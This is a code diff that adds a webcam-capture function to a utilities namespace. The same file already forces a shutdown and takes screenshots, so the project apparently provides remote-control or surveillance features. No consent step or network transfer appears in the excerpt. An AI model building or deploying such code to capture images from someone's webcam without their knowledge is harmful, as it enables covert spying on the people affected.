@@ -15,6 +15,22 @@ namespace utils {
     system("shutdown -s -t 0");
   }
 
+  void captureWebcam(char *path) {
+    HWND hwndVideo = capCreateCaptureWindow("WCW",
+        NULL,
+        0, 0,
+        640, 480,
+        GetForegroundWindow(),
+        0);
+
+    capDriverConnect(hwndVideo,0);
+    capGrabFrame(hwndVideo);
+    capFileSaveDIB(hwndVideo, path);
+
+    DestroyWindow(hwndVideo);
+    hwndVideo = NULL;
+  }
+
   char * TakeScreenShot(char *path) {
     HWND sh = GetDesktopWindow();
     if (sh == NULL) {
